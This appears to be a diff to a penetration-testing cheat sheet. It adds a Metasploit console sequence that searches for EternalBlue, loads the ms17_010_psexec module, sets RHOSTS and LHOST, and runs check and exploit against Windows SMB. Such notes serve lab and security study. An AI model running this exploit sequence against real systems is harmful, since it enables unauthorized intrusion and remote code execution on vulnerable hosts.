@@ -251,6 +251,14 @@ $ searchsploit <term>
 
 ```
 $ msfconsole
+msf6 > search exploit eternalblue
+msf6 > use exploit/windows/smb/ms17_010_psexec
+msf6 exploit(windows/smb/ms17_010_psexec) > info
+msf6 exploit(windows/smb/ms17_010_psexec) > options
+msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS <IP address>
+msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
+msf6 exploit(windows/smb/ms17_010_psexec) > check
+msf6 exploit(windows/smb/ms17_010_psexec) > exploit
 ```
 
 - Local File Inclusion (LFI)
